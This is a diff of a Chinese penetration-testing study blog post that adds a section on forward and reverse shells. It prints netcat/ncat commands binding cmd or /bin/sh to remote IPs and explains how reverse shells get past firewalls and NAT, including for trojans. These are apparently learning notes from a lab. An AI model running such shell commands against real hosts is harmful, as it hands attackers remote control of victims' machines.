@@ -7,18 +7,20 @@
   
   <title>学习思考 | blog小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="基础入门  Web 应用 Web 架构 web 架构相关内容">
+  <meta name="description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="学习思考">
-<meta property="og:url" content="https://my011215.github.io/2023/06/24/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/index.html">
+<meta property="og:url" content="https://my011215.github.io/2023/06/27/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/index.html">
 <meta property="og:site_name" content="blog小窝">
-<meta property="og:description" content="基础入门  Web 应用 Web 架构 web 架构相关内容">
+<meta property="og:description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/390.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/391.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/392.png?raw=true">
-<meta property="article:published_time" content="2023-06-24T03:12:30.000Z">
-<meta property="article:modified_time" content="2023-06-24T03:04:18.530Z">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/393.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/394.png?raw=true">
+<meta property="article:published_time" content="2023-06-27T03:12:30.000Z">
+<meta property="article:modified_time" content="2023-06-27T15:29:26.585Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/390.png?raw=true">
@@ -78,8 +80,8 @@
       <div class="outer">
         <section id="main"><article id="post-Penetration testing/学习思考" class="article article-type-post" itemscope itemprop="blogPost"> 
 <div class="article-meta">
-    <a href="/2023/06/24/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" class="article-date">
-  <time datetime="2023-06-24T03:12:30.000Z" itemprop="datePublished">2023-06-24</time>
+    <a href="/2023/06/27/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" class="article-date">
+  <time datetime="2023-06-27T03:12:30.000Z" itemprop="datePublished">2023-06-27</time>
 </a>
 
 
@@ -111,6 +113,7 @@
 <li><a href="#web%E5%BA%94%E7%94%A8">Web 应用</a></li>
 <li><a href="#web%E6%9E%B6%E6%9E%84">Web 架构</a></li>
 <li><a href="#web%E6%9E%B6%E6%9E%84%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9">web 架构相关内容</a></li>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹 shell</a></li>
 </ul>
 </li>
 </ul>
@@ -313,11 +316,102 @@ Imperva SecureSphere</p>
 把浏览器资源分到自己的多台服务器资源上，根据权重分配，这样的话就存在多个目标，IP 就会有多个，但是自然没有 CDN 那么多，而且也不会有就近分配的特点。</li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#定义负载设置</span><br><span class="line">upstream fzjh&#123;</span><br><span class="line">	server 47.94.236.117:80 weight=2;</span><br><span class="line">	server 47.122.22.195:80 weight=1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#定义访问路径 访问策略</span><br><span class="line">location / &#123;</span><br><span class="line">    proxy_pass http://fzjh/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="反弹-shell"> 反弹 shell</span></h3>
+<ul>
+<li>命令生成工具<br>
+<a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?download"> https://forum.ywhack.com/bountytips.php?download</a></li>
+</ul>
+<ol>
+<li>linux 控制 windows<br>
+widows:  142.112.11.21<br>
+linux:  116.47.21.8<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/393.png?raw=true" alt></li>
+</ol>
+<ul>
+<li>正向连接</li>
+</ul>
+<p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绑定CMD到本地5566端口</span><br><span class="line">nc -e cmd -lvp 5566</span><br></pre></td></tr></table></figure>
+<p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主动连接目标5566</span><br><span class="line">ncat 142.112.11.21 5566</span><br></pre></td></tr></table></figure>
+<ul>
+<li>反向连接</li>
+</ul>
+<p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//等待5566连接</span><br><span class="line">ncat -lvvp 5566</span><br></pre></td></tr></table></figure>
+<p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//绑定CMD到目标5566端口</span><br><span class="line">nc -e cmd 116.47.21.8 5566</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>windows 控制 linux<br>
+widows:  142.112.11.21<br>
+linux:  116.47.21.8</li>
+</ol>
+<ul>
+<li>正向连接</li>
+</ul>
+<p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//绑定SH到本地5566端口</span><br><span class="line">ncat -e /bin/sh -lvp 5566</span><br></pre></td></tr></table></figure>
+<p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//主动连接目标5566</span><br><span class="line">nc 116.47.21.8 5566</span><br></pre></td></tr></table></figure>
+<ul>
+<li>反向连接</li>
+</ul>
+<p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">等待5566连接</span><br><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure>
+<p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//绑定sh到目标5566端口</span><br><span class="line">ncat -e /bin/sh 142.112.11.21 5566</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>为什么需要反弹 shell</li>
+</ol>
+<ul>
+<li>
+<p>解决数据回显、无图形化问题<br>
+有时候命令执行数据可能不会回显显示，还有就是操作比较麻烦，我们采用反弹 shell 的思路进行连接可以轻松得到对方主机命令界面，获取我们想要的很多数据。</p>
+</li>
+<li>
+<p>防火墙绕过（出站入站设置）<br>
+目标机因防火墙受限，目标机器只能发送请求，不能接收请求。<br>
+widows:  142.112.11.21<br>
+linux:  116.47.21.8<br>
+linux 控制 windows<br>
+（1）开启入站策略（入站请求进行过滤）<br>
+这个时候可以考虑出站，既然 L 不能主动连接 W，那么就让 W 把权限放给 L 的端口，L 保持监听。<br>
+反向连接<br>
+ Linux</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvvp 5566</span><br></pre></td></tr></table></figure>
+<p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd 116.47.21.8 5566</span><br></pre></td></tr></table></figure>
+<p>我不敢轻易动本机防火墙配置，把实验改成虚拟机的两台机器，一台 kali，一台 Centos。同样俺们的 kali 充当攻击机的角色。</p>
+<p>（2）开启出站策略（出战请求过滤）<br>
+这个时候出站严格就要考虑入站，那就 L 主动连接 W 吧。<br>
+正向连接<br>
+ windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绑定CMD到本地5566端口</span><br><span class="line">nc -e cmd -lvp 5566</span><br></pre></td></tr></table></figure>
+<p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主动连接目标5566</span><br><span class="line">ncat 142.112.11.21 5566</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>内网服务器、IP 动态变化<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/394.png?raw=true" alt><br>
+如图，如果想要 A 控制 B。<br>
+（1）我们先考虑正向连接，如果 A 给 B 发送连接请求，由于 B 的 IP 是内网 IP 不是和 A 一个局域网的，导致无法连接上，在者就是如果 B 的 IP 是变化的也无法连接。<br>
+（2）我们再考虑反向连接，如果 B 把权限给到 A 的端口，A 保持监听，由于 A 攻击者让 B 发请求肯定是确定 A 的 IP（可以控制），所以不存在连接不上的问题，除非 B 设置了出站策略。</p>
+</li>
+<li>
+<p>综上<br>
+（1）目标机因防火墙受限，目标机器只能发送请求，不能接收请求。<br>
+（2）目标机端口被占用。<br>
+（3）目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。<br>
+（4）对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</p>
+</li>
+</ul>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://my011215.github.io/2023/06/24/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" data-id="cli2xd5rx0000g8tn92wf64l6" class="article-share-link">Share</a>
+      <a data-url="https://my011215.github.io/2023/06/27/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" data-id="cli2xd5rx0000g8tn92wf64l6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -374,7 +468,7 @@ Imperva SecureSphere</p>
       <ul>
         
           <li>
-            <a href="/2023/06/24/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/">学习思考</a>
+            <a href="/2023/06/27/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/">学习思考</a>
           </li>
         
           <li>
